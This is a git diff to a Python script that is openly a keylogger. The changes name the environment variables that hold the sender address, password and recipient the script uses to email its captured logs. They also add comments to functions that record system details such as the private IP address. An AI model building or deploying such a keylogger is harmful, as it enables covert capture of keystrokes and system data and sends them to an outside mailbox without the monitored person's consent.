@@ -77,13 +77,13 @@ systemLogFile = "system.txt"
 # Authentication capture variables removed before uploading to github.
 
 # Email address of the sender.
-email_from = os.environ.get('')
+email_from = os.environ.get('keyloggerEmailAddress')
 
 # Email password, secured via Windows 11 enviromental variables settings.
-authenticated_password = os.environ.get('')
+authenticated_password = os.environ.get('keyloggerEmailAuthPassword')
 
 # Email address of the reciever.
-email_to = os.environ.get('')
+email_to = os.environ.get('keyloggerEmailAddress')
 
 # Email subject line.
 email_subject = "Keylogger - [Subject not captured]"
@@ -291,7 +291,7 @@ def sendEmail(fileName, pathToFile, destination, systemLogFile):
     print("email sent")
 
 # ---------------------------------------------------------------
-#
+# Captures system information and logs that into a file.
 def computerInformation():
     
     #
@@ -309,7 +309,7 @@ def computerInformation():
         systemLog.write("Private IP Address: " + IPAddr + "\n")
 
 # ---------------------------------------------------------------
-#
+# Clears the system information file of any data, this is done to stop stored data being duplicated into the file every time the script is run.
 def clearComputerInformation():
 
     open(filePath + extend + systemLogFile, 'w').close()
